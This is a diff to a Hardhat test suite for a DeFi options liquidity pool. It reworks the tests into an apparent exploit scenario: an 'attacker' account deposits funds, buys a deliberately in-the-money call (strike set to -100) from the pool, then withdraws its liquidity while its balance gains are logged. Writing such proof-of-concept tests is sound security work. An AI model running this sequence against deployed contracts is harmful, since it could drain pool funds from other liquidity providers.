@@ -74,7 +74,7 @@ const chainId = 1
 const oTokenDecimalShift18 = 10000000000
 // amount of dollars OTM written options will be (both puts and calls)
 // use negative numbers for ITM options
-const strike = "20"
+const strike = "-100"
 
 // balances to deposit into the LP
 const liquidityPoolUsdcDeposit = "10000"
@@ -169,24 +169,7 @@ describe("Options protocol", function () {
 		optionRegistry = _optionRegistry
 		expect(optionRegistry).to.have.property("deployTransaction")
 	})
-	it("Creates an option token series", async () => {
-		const [sender] = signers
-		const issue = await optionRegistry.issue(
-			WETH_ADDRESS[chainId],
-			USDC_ADDRESS[chainId],
-			expiration,
-			call,
-			strike,
-			WETH_ADDRESS[chainId]
-		)
-		await expect(issue).to.emit(optionRegistry, "OptionTokenCreated")
-		const receipt = await issue.wait(1)
-		const events = receipt.events
-		const removeEvent = events?.find(x => x.event == "OptionTokenCreated")
-		const seriesAddress = removeEvent?.args?.token
-		// save the option token address
-		optionToken = new Contract(seriesAddress, Otoken.abi, sender) as IOToken
-	})
+
 	it("Should deploy price feed", async () => {
 		ethUSDAggregator = await deployMockContract(signers[0], AggregatorV3Interface.abi)
 
@@ -336,7 +319,6 @@ describe("Options protocol", function () {
 		const wethAttacker = weth.connect(attacker)
 		const wethDeposit = await wethAttacker.deposit({ value: toWei("99") })
 		await wethDeposit.wait(1)
-		console.log(await wethERC20.balanceOf(attackerAddress), await usd.balanceOf(attackerAddress))
 		const lpAttacker = liquidityPool.connect(attacker)
 		await wethAttacker.approve(liquidityPool.address, toWei("1"))
 		const totalSupply = await liquidityPool.totalSupply()
@@ -352,10 +334,10 @@ describe("Options protocol", function () {
 	})
 
 	let lpCallOption: IOToken
-	it("LP Writes a WETH/USD call collateralized by WETH for premium", async () => {
+	it("LP Writes a WETH/USD call collateralized by WETH for premium to the attacker", async () => {
+		const [liquidityProvider, attacker] = signers
 		// registry requires liquidity pool to be owner
 		optionRegistry.setLiquidityPool(liquidityPool.address)
-		const [liquidityProvider, attacker] = signers
 		const amount = toWei("1")
 		const blockNum = await ethers.provider.getBlockNumber()
 		const block = await ethers.provider.getBlock(blockNum)
@@ -365,12 +347,15 @@ describe("Options protocol", function () {
 
 		const priceQuote = await priceFeed.getNormalizedRate(weth.address, usd.address)
 		console.log(priceQuote)
+		console.log(
+			utils.formatEther(await wethERC20.balanceOf(attackerAddress)),
+			utils.formatUnits(await usd.balanceOf(attackerAddress), 6)
+		)
 		const strikePrice = priceQuote.add(toWei(strike))
-		//await usd.mint(senderAddress, toWei('6000'))
-		await usd.connect(attacker).approve(liquidityPool.address, toUSDC("2000"))
+		// await usd.connect(attacker).approve(liquidityPool.address, toUSDC("2000"))
 		// await weth.deposit({ value: amount.mul("5") })
 		// await weth.approve(liquidityPool.address, amount.mul("5"))
-		await liquidityPool.addLiquidity(toUSDC("6000"), amount.mul("4"), 0, 0)
+		// await liquidityPool.addLiquidity(toUSDC("6000"), amount.mul("4"), 0, 0)
 		const lpUSDBalanceBefore = await usd.balanceOf(liquidityPool.address)
 		const proposedSeries = {
 			expiration: fmtExpiration(expiration),
@@ -380,12 +365,15 @@ describe("Options protocol", function () {
 			underlying: weth.address
 		}
 		const quote = await liquidityPool.quotePriceWithUtilization(proposedSeries, amount)
-		await usd.approve(liquidityPool.address, quote.toString())
-		const write = await liquidityPool.issueAndWriteOption(
-			proposedSeries,
-			amount,
-			WETH_ADDRESS[chainId]
-		)
+		await usd
+			.connect(attacker)
+			.approve(
+				liquidityPool.address,
+				Math.ceil(parseFloat(utils.formatUnits(BigNumber.from(quote), 12)))
+			)
+		const write = await liquidityPool
+			.connect(attacker)
+			.issueAndWriteOption(proposedSeries, amount, WETH_ADDRESS[chainId])
 		const receipt = await write.wait(1)
 		const events = receipt.events
 		const writeEvent = events?.find(x => x.event == "WriteOption")
@@ -402,5 +390,23 @@ describe("Options protocol", function () {
 		expect(writersBalance).to.eq(amount)
 		expect(fromOpyn(buyerOptionBalance)).to.eq(fromWei(amount))
 		expect(fromOpyn(totalInterest)).to.eq(fromWei(amount))
+	})
+
+	it("attacker withdraws liquidity", async () => {
+		const [liquidityProvider, attacker] = signers
+		const shares = await liquidityPool.balanceOf(attackerAddress)
+		console.log({ shares })
+		const usdcBalanceBefore = await usd.balanceOf(attackerAddress)
+		const wethBalanceBefore = await wethERC20.balanceOf(attackerAddress)
+		await liquidityPool.connect(attacker).removeLiquidity(shares, 0, 0)
+		const usdcBalanceAfter = await usd.balanceOf(attackerAddress)
+		const wethBalanceAfter = await wethERC20.balanceOf(attackerAddress)
+
+		console.log(
+			utils.formatEther(wethBalanceBefore),
+			utils.formatEther(wethBalanceAfter),
+			utils.formatUnits(usdcBalanceBefore, 6),
+			utils.formatUnits(usdcBalanceAfter, 6)
+		)
 	})
 })
